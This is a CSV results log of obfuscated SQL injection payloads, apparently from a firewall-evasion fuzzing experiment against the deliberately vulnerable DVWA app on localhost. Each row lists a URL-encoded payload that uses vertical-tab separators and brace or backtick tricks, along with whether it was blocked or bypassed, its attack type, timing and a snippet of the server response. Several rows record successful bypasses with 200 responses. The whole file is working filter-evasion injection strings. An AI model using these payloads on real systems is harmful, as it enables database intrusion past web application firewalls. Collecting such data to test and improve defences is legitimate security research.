Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=1+or+not%0b{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0189,73.08,No,500,
0%27<@!=.1+||%0b!+{a+1}=1=%0b(not+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0167,73.08,No,500,
0'<@!=.1+||+not+{a%0b1}=1=%0b(!%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0323,73.08,No,500,
0'<@=1+or%0bnot+{x+(select+1)}=1=+(not%0b{`if`+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0226,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or+1<@%0bor%0bnot%0b{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0357,73.08,No,500,
0'<@!=1%0b||%0bnot+{a%0b1}=1=+(not%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0175,73.08,No,500,
0%27<@!=1.+or+!%0b1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0228,73.08,No,500,
0'<@=.1+||+!+{a+1}=1=+(not~0)--+,Blocked,No,None,piggyAtk,0.0167,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||+not+1=+(!%0btrue)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0411,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||%0b1<@+||+{x+(select%0b1)}=1%0blike%0b{`if`+1}=1+||',Blocked,No,None,Unknown,0.0275,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not%0b{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0176,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+not+{x%0b(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.029,72.88,No,500,
0%27<@=.1+or+not+{a+1}=1=%0b(not+true)+or',Bypassed,No,None,booleanAtk,0.017,72.88,No,500,
0%27<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=+(!%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0339,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{a%0b1}=1=+(!+true)+or',Blocked,No,None,booleanAtk,0.0308,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!+{x+(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0474,72.88,No,500,
0'<@=.1+||%0bnot+{x%0b(select%0b1)}=1=+(false)--+,Bypassed,No,None,piggyAtk,0.0228,72.88,No,500,
0'<@!=1.+||%0bnot+{`if`+1}=1=+(!%0b{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0399,72.88,No,500,
0%27<@!=.1+or%0bnot+{a%0b1}=1=+(not+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.0128,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor+not+{`if`+1}=1=%0b(not+true)%0b||',Bypassed,No,None,booleanAtk,0.0665,72.88,No,500,
0%27<@!=1.+||+!%0b{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0249,72.88,No,500,
0%27<@=.1+||%0b{x+(select+1)}=1+like+{x+(select+1)}=1%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0319,72.98,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.+or%0bnot%0b{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0178,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.%0b||%0bnot+{`if`+1}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0263,73.08,No,500,
0'<@=.1%0bor%0b!+{a%0b1}=1=%0b(!+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0295,73.08,No,500,
0%27<@!=1.%0b||%0bnot+{x+(select+1)}=1=%0b(!+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0356,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||%0b!@<@%0b||%0bnot+{`if`+1}=1=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0187,73.08,No,500,
0'<@=1.%0bor%0bnot%0b{`if`+1}=1=+(!~false)+||',Bypassed,No,None,booleanAtk,0.014,73.08,No,500,
0%27<@!=1+||+not+{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0118,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0bnot+{a%0b1}=1=+(not+{x+(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0191,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+!+{x+(select%0b1)}=1=%0b(not+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0135,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor%0bnot+true=+(!+1)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0165,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+not+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Blocked,No,None,Unknown,0.0126,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor+!%0b{`if`+1}=1=+(not%0b{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0205,73.08,No,500,
0%27<@=1.%0b||%0b!+{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0205,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+false=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0154,73.08,No,500,
0%27<@=.1%0b||+!%0b{x+(select%0b1)}=1=+(0)+or',Bypassed,No,None,Unknown,0.0162,73.08,No,500,
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1%0bis+false+||%27,Blocked,No,None,Unknown,0.0179,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+not%0b1=+(!~false)--%0b,Blocked,No,None,piggyAtk,0.0121,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor+!+{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0311,73.08,No,500,
0'<@=1.%0b||+not+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.028,73.08,No,500,
0'<@!=1%0b||+not%0btrue=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0299,73.08,No,500,
0%27or%0b@<@.+or+not%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0214,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||%0bnot%0b{`if`+1}=1=%0b(!%7efalse)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0258,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+!+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0338,73.08,No,500,
0%27<@!=1+||%0bnot+{`if`%0b1}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0344,73.08,No,500,
0%27<@!=.1+||%0b!+{a+1}=1+is+false%0bor',Blocked,No,None,booleanAtk,0.0267,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0bnot+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0183,73.08,No,500,
0'<@!=.1%0b||+not+{x+(select+1)}=1=%0b(!%0b{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0172,73.08,No,500,
0'<@=.1+or%0b!%0b{x+(select%0b1)}=1=%0b(!+{a+1}=1)%0b||',Blocked,No,None,Unknown,0.0139,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||+not%0b{a+1}=1=+(not+1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0237,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)--+,Blocked,No,None,piggyAtk,0.01,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0283,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0b!%0b{`if`+1}=1=+(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0493,73.08,No,500,
0%27<@!=1+||+{a+1}=1+like%0b{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0265,73.08,No,500,
0%27<@!=1+or+!+{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0274,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor%0bnot%0b{`if`%0b1}=1=+(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0109,73.08,No,500,
0%27||+!@<@.+or%0bnot+{x+(select%0b1)}=1=%0b(!%0b{`if`+1}=1)+||%27,Blocked,No,None,Unknown,0.0198,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+!+{a+1}=1=%0b(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0256,72.88,No,500,
0%27<@=1%0b||%0b{a%0b1}=1%0blike+{x+(select%0b1)}=1--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0371,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not~false=%0b(!+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0266,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||+!%0b{a+1}=1=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0342,72.88,No,500,
0%27<@!=1.%0bor+not%0b{a%0b1}=1=+(not%0b{`if`+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0307,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0bnot+{x%0b(select+1)}=1=%0b(!+{a%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0361,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+not%0btrue=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0415,72.88,No,500,
0%27<@=.1+or%0bnot+{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0239,72.98,No,500,
